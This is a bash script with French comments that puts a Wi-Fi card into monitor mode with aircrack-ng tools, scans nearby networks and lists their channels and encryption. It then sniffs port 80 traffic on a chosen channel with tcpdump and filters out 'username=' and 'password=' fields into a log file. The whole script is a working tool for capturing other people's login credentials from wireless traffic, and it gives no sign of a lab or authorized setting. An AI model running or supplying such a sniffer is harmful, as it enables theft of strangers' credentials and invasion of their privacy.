#!/bin/bash

# Vérifie si aircrack-ng est installé
if ! command -v airmon-ng &> /dev/null; then
    echo "[❌] aircrack-ng n'est pas installé ! Installe-le avec : sudo apt install aircrack-ng"
    exit 1
fi

# Détecte l'interface Wi-Fi
INTERFACE=$(sudo airmon-ng | awk 'NR>2 && $2!="" {print $2; exit}')

if [[ -z "$INTERFACE" ]]; then
    echo "[❌] Aucune carte Wi-Fi détectée ! Vérifie ta connexion."
    exit 1
fi

echo "[✅] Carte détectée : $INTERFACE"

# Vérifie si l'interface est déjà en mode monitor
if iw dev "$INTERFACE" info | grep -q "type monitor"; then
    echo "[✅] L'interface $INTERFACE est déjà en mode monitor."
    MONITOR_INTERFACE="$INTERFACE"
else
    # Active le mode monitor
    sudo airmon-ng start "$INTERFACE"
    MONITOR_INTERFACE="${INTERFACE}mon"
    
    # Vérifie si l'activation a fonctionné
    if ! iw dev "$MONITOR_INTERFACE" info | grep -q "type monitor"; then
        echo "[❌] Impossible d'activer le mode monitor sur $INTERFACE."
        exit 1
    fi
    
    echo "[✅] Mode monitor activé sur : $MONITOR_INTERFACE"
fi

# Supprime les anciens fichiers de scan
rm -f networks-01.csv

# Scan des réseaux Wi-Fi avec `airodump-ng`
echo "[🔍] Scan des réseaux Wi-Fi en cours..."
sudo airodump-ng --output-format csv -w networks "$MONITOR_INTERFACE" --write-interval 1 > /dev/null 2>&1 &

# Effet de chargement (7 secondes)
echo -ne "[🔄] Attente du scan"
for i in {1..7}; do
    echo -ne "."
    sleep 1
done
echo ""

# Arrêter le scan
sudo pkill airodump-ng

# Vérifie si le fichier de scan a été généré
if [ ! -f networks-01.csv ]; then
    echo "[❌] Aucun réseau détecté. Vérifie que la carte est bien en mode monitor."
    exit 1
fi

# Afficher les canaux, SSID et type de chiffrement
echo "📡 Réseaux détectés :"
awk -F',' '
NR>2 {
    ssid=$14
    canal=$4
    encryption=$6

    if (encryption ~ /WPA3/) {
        security="WPA3"
    } else if (encryption ~ /WPA2/) {
        security="WPA2"
    } else if (encryption ~ /WPA/) {
        security="WPA"
    } else if (encryption ~ /WEP/) {
        security="WEP"
    } else {
        security="OPEN"
    }

    printf "Canal: %-3s | Sécurité: %-4s | SSID: %s\n", canal, security, ssid
}' networks-01.csv | column -t

# Demande à l'utilisateur de choisir un canal
echo ""
read -p "📡 Entre le numéro du canal à surveiller : " CANAL

# Bascule la carte Wi-Fi sur le canal choisi
sudo iw dev "$MONITOR_INTERFACE" set channel "$CANAL"
echo "[✅] Surveillance du canal $CANAL..."

# Lancer la capture avec tcpdump et afficher un message si aucun paquet intéressant n'est capturé
rm -f capture.log interesting.log
echo "[📡] Capture en cours... (Appuie sur CTRL+C pour arrêter)"
sudo tcpdump -l -i "$MONITOR_INTERFACE" -n -s 0 -A port 80 | tee capture.log | grep --line-buffered -E "username=|password=" | tee interesting.log

if [ ! -s interesting.log ]; then
    echo "[INFO] La capture sur le port 80 a bien eu lieu, mais aucun paquet ne correspond au filtre 'username=' ou 'password='."
fi

